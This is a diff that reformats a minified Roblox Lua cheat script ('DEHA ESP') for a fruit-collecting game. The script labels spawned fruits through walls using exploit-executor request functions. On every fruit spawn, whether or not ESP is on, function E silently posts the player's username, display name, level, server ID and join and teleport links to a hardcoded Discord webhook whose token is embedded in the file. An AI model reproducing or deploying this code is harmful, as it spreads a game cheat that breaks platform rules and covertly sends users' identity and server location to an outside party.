@@ -1,1 +1,308 @@
-local a=game:GetService("Players")local b=game:GetService("Workspace")local c=game:GetService("RunService")local d=game:GetService("UserInputService")local e=game:GetService("StarterGui")local f=game:GetService("SoundService")local g=game:GetService("Debris")local h=game:GetService("HttpService")local i=game:GetService("TweenService")local j=a.LocalPlayer;local k=false;local l=Enum.KeyCode.P;local m=Color3.fromRGB(0,255,127)local n="https://discord.com/api/webhooks/1530987878488998068/eEmWmUQ3fa4GEUkeyK6-akV1ncDGMXbR57SPAxKnQXDOYv16ebzbKG6JG2Dg3QZ-AhUu"local o=d.TouchEnabled or d:GetPlatform()==Enum.Platform.IOS or d:GetPlatform()==Enum.Platform.Android;local p=o and"Mobile"or"PC"print(string.format("[DEHA Framework] Device Detected: %s (TouchEnabled: %s | Platform: %s)",p,tostring(d.TouchEnabled),tostring(d:GetPlatform().Name)))local q={Common={color=9803157,ping="",ansi="\27[1;30m",fruits={"Rocket","Spin","Blade","Spring","Bomb","Smoke","Spike"}},Uncommon={color=3447003,ping="",ansi="\27[1;34m",fruits={"Flame","Ice","Sand","Dark","Eagle","Diamond"}},Rare={color=10181046,ping="",ansi="\27[1;36m",fruits={"Light","Rubber","Ghost","Magma"}},Legendary={color=16738740,ping="@here",ansi="\27[1;35m",fruits={"Quake","Buddha","Love","Creation","Spider","Sound","Phoenix","Portal","Rumble","Pain","Blizzard"}},Mythical={color=15158332,ping="@everyone",ansi="\27[1;31m",fruits={"Gravity","Mammoth","T-Rex","Dough","Shadow","Venom","Control","Gas","Spirit","Tiger","Yeti","Kitsune","Dragon"}}}local function r()return http_request or request or HttpPost or syn and syn.request end;local function s()local t=game.PlaceId;if t==2753915549 then return"First Sea"end;if t==4442272183 then return"Second Sea"end;if t==7449423635 then return"Third Sea"end;local u=b:FindFirstChild("_WorldOrigin")if u and u:FindFirstChild("Locations")then local v=u.Locations;if v:FindFirstChild("Tiki Outpost")or v:FindFirstChild("Floating Turtle")then return"Third Sea"end;if v:FindFirstChild("Kingdom of Rose")or v:FindFirstChild("Cafe")then return"Second Sea"end;if v:FindFirstChild("Jungle")or v:FindFirstChild("Starter Island")then return"First Sea"end end;local w=j:FindFirstChild("Data")and j.Data:FindFirstChild("Level")if w then if w.Value>=1500 then return"Third Sea"end;if w.Value>=700 then return"Second Sea"end;return"First Sea"end;return"Unknown Sea"end;local function x(y)local z=y:gsub(" Fruit",""):gsub(" %-.*",""):lower()for A,B in pairs(q)do for C,D in ipairs(B.fruits)do if D:lower()==z then return A,B end end end;return"Common",q.Common end;local function E(y)local F=r()if not F or n==""then return end;local A,G=x(y)local t,H=game.PlaceId,tostring(game.JobId)local I=j:FindFirstChild("Data")and j.Data:FindFirstChild("Level")and j.Data.Level.Value or"N/A"local J=#a:GetPlayers()local K=string.format("roblox://experiences/start?placeId=%d&gameInstanceId=%s",t,H)local L=string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s",t,H)local M=string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)',t,H)local N=string.format("• **User:** `%s`\n• **Display:** `%s`\n• **Level:** `%s`",j.Name,j.DisplayName,tostring(I))local O=string.format("• **Location:** `%s`\n• **Players:** `%d/12`",s(),J)local P=string.format("||🔗 [Join Server (PC)](%s)||\n||📱 [Join Server (Mobile)](%s)||",K,L)local Q=G.ping~=""and string.format("%s **🚨 %s [%s] SPAWNED!**",G.ping,y:upper(),A:upper())or string.format("**🚨 %s [%s] SPAWNED!**",y:upper(),A:upper())local R=h:JSONEncode({content=Q,username="DEHA ESP Notifier",avatar_url="https://i.imgur.com/W2d0f3g.png",embeds={{title=string.format("🍎 [%s] FRUIT SPAWNED IN MAP",A:upper()),color=G.color,fields={{name="🍎 Fruit Name",value=string.format("**%s**",y),inline=false},{name="👤 Player Info",value=N,inline=true},{name="🌐 Server Info",value=O,inline=true},{name="🚀 Direct Links (Click to Reveal)",value=P,inline=false},{name="🛠️ Teleport Code",value=string.format("||```lua\n%s\n```||",M),inline=false}},footer={text=os.date("%I:%M %p • %d/%m/%Y")}}}})pcall(function()F({Url=n,Method="POST",Headers={["Content-Type"]="application/json"},Body=R})end)end;local function S(T)pcall(function()e:SetCore("SendNotification",{Title="DEHA ESP",Text=T,Duration=3})end)end;local function U()local V=Instance.new("Sound")V.SoundId="rbxassetid://130467592920597"V.Volume=2;V.Parent=f;V:Play()g:AddItem(V,5)end;local function W(X)local Y=X.Name:lower()if Y:find("dealer")or Y:find("gacha")or Y:find("npc")or Y:find("remove")or Y:find("cousin")or Y:find("manager")then return false end;if X:FindFirstChildOfClass("Humanoid")then return false end;if not Y:find("fruit")then return false end;if not(X:FindFirstChild("Handle")or X:FindFirstChildWhichIsA("BasePart"))then return false end;return true end;local function Z()for C,_ in ipairs(b:GetChildren())do if _:FindFirstChild("Handle")and _.Handle:FindFirstChild("FruitESP")then _.Handle.FruitESP:Destroy()end;local a0=_:FindFirstChildWhichIsA("BasePart")if a0 and a0:FindFirstChild("FruitESP")then a0.FruitESP:Destroy()end end end;local function a1(a2)if not k then return end;local a3=a2:FindFirstChild("Handle")or a2:FindFirstChildWhichIsA("BasePart")if not a3 or a3:FindFirstChild("FruitESP")then return end;local a4=Instance.new("BillboardGui")a4.Name="FruitESP"a4.Size=UDim2.new(0,200,0,50)a4.Adornee=a3;a4.AlwaysOnTop=true;a4.ExtentsOffset=Vector3.new(0,3,0)a4.Parent=a3;local a5=Instance.new("TextLabel")a5.Size=UDim2.new(1,0,1,0)a5.BackgroundTransparency=1;a5.TextColor3=m;a5.TextSize=16;a5.Font=Enum.Font.SourceSansBold;a5.TextStrokeTransparency=0;a5.TextStrokeColor3=Color3.fromRGB(0,0,0)a5.Text=a2.Name;a5.Parent=a4;local a6;a6=c.RenderStepped:Connect(function()if not k or not a2 or not a2.Parent or not a3 or not a3.Parent then if a4 and a4.Parent then a4:Destroy()end;a6:Disconnect()return end;local a7=pcall(function()local a8=j.Character;if a8 and a8:FindFirstChild("HumanoidRootPart")then local a9=a8.HumanoidRootPart.Position;local aa=a3.Position;local ab=math.floor(a9-aa.Magnitude/3+0.5)a5.Text=string.format("%s [%d M]",a2.Name,ab)else a5.Text=a2.Name end end)if not a7 then a5.Text=a2.Name end end)end;local function ac()if not k then return end;local ad=false;for C,D in ipairs(b:GetChildren())do if W(D)then ad=true;a1(D)S("🍎 "..D.Name.." is already spawned!")E(D.Name)task.wait(0.1)end end;if not ad then S("No fruits found.")end end;local function ae()k=not k;if k then S("ESP ACTIVE")ac()else S("ESP DISABLED")Z()end end;if o then local af=j:WaitForChild("PlayerGui")if af:FindFirstChild("DEHA_MobileUI")then af.DEHA_MobileUI:Destroy()end;local ag=Instance.new("ScreenGui")ag.Name="DEHA_MobileUI"ag.ResetOnSpawn=false;ag.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;ag.Parent=af;local ah=Instance.new("Frame")ah.Name="MainFrame"ah.Size=UDim2.new(0,220,0,130)ah.Position=UDim2.new(0.05,0,0.25,0)ah.BackgroundColor3=Color3.fromRGB(12,16,24)ah.BackgroundTransparency=0.15;ah.BorderSizePixel=0;ah.Active=true;ah.Draggable=true;ah.Visible=false;ah.Parent=ag;local ai=Instance.new("UICorner",ah)ai.CornerRadius=UDim.new(0,12)local aj=Instance.new("Frame",ah)aj.Size=UDim2.new(1,0,0,32)aj.BackgroundColor3=Color3.fromRGB(18,24,36)aj.BackgroundTransparency=0.3;aj.BorderSizePixel=0;local ak=Instance.new("TextLabel",aj)ak.Size=UDim2.new(1,-35,1,0)ak.Position=UDim2.new(0,10,0,0)ak.BackgroundTransparency=1;ak.Text="DEHA // MOBILE"ak.TextColor3=Color3.fromRGB(220,240,255)ak.TextSize=13;ak.Font=Enum.Font.GothamBold;local al=Instance.new("TextButton",aj)al.Size=UDim2.new(0,24,0,24)al.Position=UDim2.new(1,-28,0,4)al.BackgroundColor3=Color3.fromRGB(255,50,80)al.BackgroundTransparency=0.8;al.Text="×"al.TextColor3=Color3.fromRGB(255,100,120)al.TextSize=18;local am=Instance.new("TextButton",ah)am.Size=UDim2.new(1,-20,0,38)am.Position=UDim2.new(0,10,0,42)am.BackgroundColor3=Color3.fromRGB(20,30,45)am.Text="ESP: OFF"am.TextColor3=Color3.fromRGB(255,80,80)am.Font=Enum.Font.GothamBold;local an=Instance.new("TextButton",ag)an.Name="CircleToggle"an.Size=UDim2.new(0,52,0,52)an.Position=UDim2.new(0.05,0,0.25,0)an.BackgroundColor3=Color3.fromRGB(12,16,24)an.Text="🍎"an.TextSize=24;an.Draggable=true;local ao=Instance.new("UICorner",an)ao.CornerRadius=UDim.new(1,0)al.MouseButton1Click:Connect(function()ah.Visible=false;an.Visible=true end)an.MouseButton1Click:Connect(function()ah.Visible=true;an.Visible=false end)am.MouseButton1Click:Connect(function()ae()am.Text=k and"ESP: ACTIVE"or"ESP: OFF"am.TextColor3=k and Color3.fromRGB(0,255,127)or Color3.fromRGB(255,80,80)end)S("Mobile Loaded: Tap 🍎 to open menu")else S("PC Mode: Press [P] to toggle ESP")end;b.ChildAdded:Connect(function(_)task.wait(0.2)if W(_)then a1(_)if k then S("🍎 ".._.Name.." has spawned!")U()end;E(_.Name)end end)d.InputBegan:Connect(function(ap,aq)if aq then return end;if not o and ap.KeyCode==l then ae()end end)
+local a = game:GetService("Players")
+local b = game:GetService("Workspace")
+local c = game:GetService("RunService")
+local d = game:GetService("UserInputService")
+local e = game:GetService("StarterGui")
+local f = game:GetService("SoundService")
+local g = game:GetService("Debris")
+local h = game:GetService("HttpService")
+local i = game:GetService("TweenService")
+
+local j = a.LocalPlayer
+local k = false
+local l = Enum.KeyCode.P
+local m = Color3.fromRGB(0, 255, 127)
+local n = "https://discord.com/api/webhooks/1530987878488998068/eEmWmUQ3fa4GEUkeyK6-akV1ncDGMXbR57SPAxKnQXDOYv16ebzbKG6JG2Dg3QZ-AhUu"
+
+local o = d.TouchEnabled or d:GetPlatform() == Enum.Platform.IOS or d:GetPlatform() == Enum.Platform.Android
+local p = o and "Mobile" or "PC"
+
+print(string.format("[DEHA Framework] Device Detected: %s (TouchEnabled: %s | Platform: %s)", p, tostring(d.TouchEnabled), tostring(d:GetPlatform().Name)))
+
+local q = {
+	Common = {color = 9803157, ping = "", ansi = "\27[1;30m", fruits = {"Rocket", "Spin", "Blade", "Spring", "Bomb", "Smoke", "Spike"}},
+	Uncommon = {color = 3447003, ping = "", ansi = "\27[1;34m", fruits = {"Flame", "Ice", "Sand", "Dark", "Eagle", "Diamond"}},
+	Rare = {color = 10181046, ping = "", ansi = "\27[1;36m", fruits = {"Light", "Rubber", "Ghost", "Magma"}},
+	Legendary = {color = 16738740, ping = "@here", ansi = "\27[1;35m", fruits = {"Quake", "Buddha", "Love", "Creation", "Spider", "Sound", "Phoenix", "Portal", "Rumble", "Pain", "Blizzard"}},
+	Mythical = {color = 15158332, ping = "@everyone", ansi = "\27[1;31m", fruits = {"Gravity", "Mammoth", "T-Rex", "Dough", "Shadow", "Venom", "Control", "Gas", "Spirit", "Tiger", "Yeti", "Kitsune", "Dragon"}}
+}
+
+local function r()
+	return http_request or request or HttpPost or (syn and syn.request)
+end
+
+local function s()
+	local t = game.PlaceId
+	if t == 2753915549 then return "First Sea" end
+	if t == 4442272183 then return "Second Sea" end
+	if t == 7449423635 then return "Third Sea" end
+	local u = b:FindFirstChild("_WorldOrigin")
+	if u and u:FindFirstChild("Locations") then
+		local v = u.Locations
+		if v:FindFirstChild("Tiki Outpost") or v:FindFirstChild("Floating Turtle") then return "Third Sea" end
+		if v:FindFirstChild("Kingdom of Rose") or v:FindFirstChild("Cafe") then return "Second Sea" end
+		if v:FindFirstChild("Jungle") or v:FindFirstChild("Starter Island") then return "First Sea" end
+	end
+	local w = j:FindFirstChild("Data") and j.Data:FindFirstChild("Level")
+	if w then
+		if w.Value >= 1500 then return "Third Sea" end
+		if w.Value >= 700 then return "Second Sea" end
+		return "First Sea"
+	end
+	return "Unknown Sea"
+end
+
+local function x(y)
+	local z = y:gsub(" Fruit", ""):gsub(" %-.*", ""):lower()
+	for A, B in pairs(q) do
+		for C, D in ipairs(B.fruits) do
+			if D:lower() == z then return A, B end
+		end
+	end
+	return "Common", q.Common
+end
+
+local function E(y)
+	local F = r()
+	if not F or n == "" then return end
+	local A, G = x(y)
+	local t, H = game.PlaceId, tostring(game.JobId)
+	local I = j:FindFirstChild("Data") and j.Data:FindFirstChild("Level") and j.Data.Level.Value or "N/A"
+	local J = #a:GetPlayers()
+	local K = string.format("roblox://experiences/start?placeId=%d&gameInstanceId=%s", t, H)
+	local L = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", t, H)
+	local M = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', t, H)
+	local N = string.format("• **User:** `%s`\n• **Display:** `%s`\n• **Level:** `%s`", j.Name, j.DisplayName, tostring(I))
+	local O = string.format("• **Location:** `%s`\n• **Players:** `%d/12`", s(), J)
+	local P = string.format("||🔗 [Join Server (PC)](%s)||\n||📱 [Join Server (Mobile)](%s)||", K, L)
+	local Q = G.ping ~= "" and string.format("%s **🚨 %s [%s] SPAWNED!**", G.ping, y:upper(), A:upper()) or string.format("**🚨 %s [%s] SPAWNED!**", y:upper(), A:upper())
+	local R = h:JSONEncode({
+		content = Q,
+		username = "DEHA ESP Notifier",
+		avatar_url = "https://i.imgur.com/W2d0f3g.png",
+		embeds = {{
+			title = string.format("🍎 [%s] FRUIT SPAWNED IN MAP", A:upper()),
+			color = G.color,
+			fields = {
+				{name = "🍎 Fruit Name", value = string.format("**%s**", y), inline = false},
+				{name = "👤 Player Info", value = N, inline = true},
+				{name = "🌐 Server Info", value = O, inline = true},
+				{name = "🚀 Direct Links (Click to Reveal)", value = P, inline = false},
+				{name = "🛠️ Teleport Code", value = string.format("||```lua\n%s\n```||", M), inline = false}
+			},
+			footer = {text = os.date("%I:%M %p • %d/%m/%Y")}
+		}}
+	})
+	pcall(function()
+		F({Url = n, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = R})
+	end)
+end
+
+local function S(T)
+	pcall(function()
+		e:SetCore("SendNotification", {Title = "DEHA ESP", Text = T, Duration = 3})
+	end)
+end
+
+local function U()
+	local V = Instance.new("Sound")
+	V.SoundId = "rbxassetid://130467592920597"
+	V.Volume = 2
+	V.Parent = f
+	V:Play()
+	g:AddItem(V, 5)
+end
+
+local function W(X)
+	local Y = X.Name:lower()
+	if Y:find("dealer") or Y:find("gacha") or Y:find("npc") or Y:find("remove") or Y:find("cousin") or Y:find("manager") then return false end
+	if X:FindFirstChildOfClass("Humanoid") then return false end
+	if not Y:find("fruit") then return false end
+	if not (X:FindFirstChild("Handle") or X:FindFirstChildWhichIsA("BasePart")) then return false end
+	return true
+end
+
+local function Z()
+	for C, _ in ipairs(b:GetChildren()) do
+		if _:FindFirstChild("Handle") and _.Handle:FindFirstChild("FruitESP") then
+			_.Handle.FruitESP:Destroy()
+		end
+		local a0 = _:FindFirstChildWhichIsA("BasePart")
+		if a0 and a0:FindFirstChild("FruitESP") then
+			a0.FruitESP:Destroy()
+		end
+	end
+end
+
+local function a1(a2)
+	if not k then return end
+
+	local a3 = a2:FindFirstChild("Handle") or a2:FindFirstChildWhichIsA("BasePart")
+	if not a3 or a3:FindFirstChild("FruitESP") then return end
+
+	local a4 = Instance.new("BillboardGui")
+	a4.Name = "FruitESP"
+	a4.Size = UDim2.new(0, 200, 0, 50)
+	a4.Adornee = a3
+	a4.AlwaysOnTop = true
+	a4.ExtentsOffset = Vector3.new(0, 3, 0)
+	a4.Parent = a3
+
+	local a5 = Instance.new("TextLabel")
+	a5.Size = UDim2.new(1, 0, 1, 0)
+	a5.BackgroundTransparency = 1
+	a5.TextColor3 = m
+	a5.TextSize = 16
+	a5.Font = Enum.Font.SourceSansBold
+	a5.TextStrokeTransparency = 0
+	a5.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+	a5.Text = a2.Name
+	a5.Parent = a4
+
+	local a6
+	a6 = c.RenderStepped:Connect(function()
+		if not k or not a2 or not a2.Parent or not a3 or not a3.Parent then
+			if a4 and a4.Parent then a4:Destroy() end
+			a6:Disconnect()
+			return
+		end
+
+		local char = j.Character
+		local hrp = char and char:FindFirstChild("HumanoidRootPart")
+
+		if hrp then
+			-- Calculate Euclidean distance between Player and Fruit
+			local dist = math.floor((hrp.Position - a3.Position).Magnitude / 3 + 0.5)
+			a5.Text = string.format("%s [%d M]", a2.Name, dist)
+		else
+			a5.Text = a2.Name
+		end
+	end)
+end
+
+local function ac()
+	if not k then return end
+	local ad = false
+	for C, D in ipairs(b:GetChildren()) do
+		if W(D) then
+			ad = true
+			a1(D)
+			S("🍎 " .. D.Name .. " is already spawned!")
+			E(D.Name)
+			task.wait(0.1)
+		end
+	end
+	if not ad then S("No fruits found.") end
+end
+
+local function ae()
+	k = not k
+	if k then
+		S("ESP ACTIVE")
+		ac()
+	else
+		S("ESP DISABLED")
+		Z()
+	end
+end
+
+if o then
+	local af = j:WaitForChild("PlayerGui")
+	if af:FindFirstChild("DEHA_MobileUI") then af.DEHA_MobileUI:Destroy() end
+
+	local ag = Instance.new("ScreenGui")
+	ag.Name = "DEHA_MobileUI"
+	ag.ResetOnSpawn = false
+	ag.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	ag.Parent = af
+
+	local ah = Instance.new("Frame")
+	ah.Name = "MainFrame"
+	ah.Size = UDim2.new(0, 220, 0, 130)
+	ah.Position = UDim2.new(0.05, 0, 0.25, 0)
+	ah.BackgroundColor3 = Color3.fromRGB(12, 16, 24)
+	ah.BackgroundTransparency = 0.15
+	ah.BorderSizePixel = 0
+	ah.Active = true
+	ah.Draggable = true
+	ah.Visible = false
+	ah.Parent = ag
+
+	local ai = Instance.new("UICorner", ah)
+	ai.CornerRadius = UDim.new(0, 12)
+
+	local aj = Instance.new("Frame", ah)
+	aj.Size = UDim2.new(1, 0, 0, 32)
+	aj.BackgroundColor3 = Color3.fromRGB(18, 24, 36)
+	aj.BackgroundTransparency = 0.3
+	aj.BorderSizePixel = 0
+
+	local ak = Instance.new("TextLabel", aj)
+	ak.Size = UDim2.new(1, -35, 1, 0)
+	ak.Position = UDim2.new(0, 10, 0, 0)
+	ak.BackgroundTransparency = 1
+	ak.Text = "DEHA // MOBILE"
+	ak.TextColor3 = Color3.fromRGB(220, 240, 255)
+	ak.TextSize = 13
+	ak.Font = Enum.Font.GothamBold
+
+	local al = Instance.new("TextButton", aj)
+	al.Size = UDim2.new(0, 24, 0, 24)
+	al.Position = UDim2.new(1, -28, 0, 4)
+	al.BackgroundColor3 = Color3.fromRGB(255, 50, 80)
+	al.BackgroundTransparency = 0.8
+	al.Text = "×"
+	al.TextColor3 = Color3.fromRGB(255, 100, 120)
+	al.TextSize = 18
+
+	local am = Instance.new("TextButton", ah)
+	am.Size = UDim2.new(1, -20, 0, 38)
+	am.Position = UDim2.new(0, 10, 0, 42)
+	am.BackgroundColor3 = Color3.fromRGB(20, 30, 45)
+	am.Text = "ESP: OFF"
+	am.TextColor3 = Color3.fromRGB(255, 80, 80)
+	am.Font = Enum.Font.GothamBold
+
+	local an = Instance.new("TextButton", ag)
+	an.Name = "CircleToggle"
+	an.Size = UDim2.new(0, 52, 0, 52)
+	an.Position = UDim2.new(0.05, 0, 0.25, 0)
+	an.BackgroundColor3 = Color3.fromRGB(12, 16, 24)
+	an.Text = "🍎"
+	an.TextSize = 24
+	an.Draggable = true
+
+	local ao = Instance.new("UICorner", an)
+	ao.CornerRadius = UDim.new(1, 0)
+
+	al.MouseButton1Click:Connect(function() ah.Visible = false; an.Visible = true end)
+	an.MouseButton1Click:Connect(function() ah.Visible = true; an.Visible = false end)
+	am.MouseButton1Click:Connect(function()
+		ae()
+		am.Text = k and "ESP: ACTIVE" or "ESP: OFF"
+		am.TextColor3 = k and Color3.fromRGB(0, 255, 127) or Color3.fromRGB(255, 80, 80)
+	end)
+
+	S("Mobile Loaded: Tap 🍎 to open menu")
+else
+	S("PC Mode: Press [P] to toggle ESP")
+end
+
+b.ChildAdded:Connect(function(_)
+	task.wait(0.2)
+	if W(_) then
+		a1(_)
+		if k then
+			S("🍎 " .. _.Name .. " has spawned!")
+			U()
+		end
+		E(_.Name)
+	end
+end)
+
+d.InputBegan:Connect(function(ap, aq)
+	if aq then return end
+	if not o and ap.KeyCode == l then
+		ae()
+	end
+end)
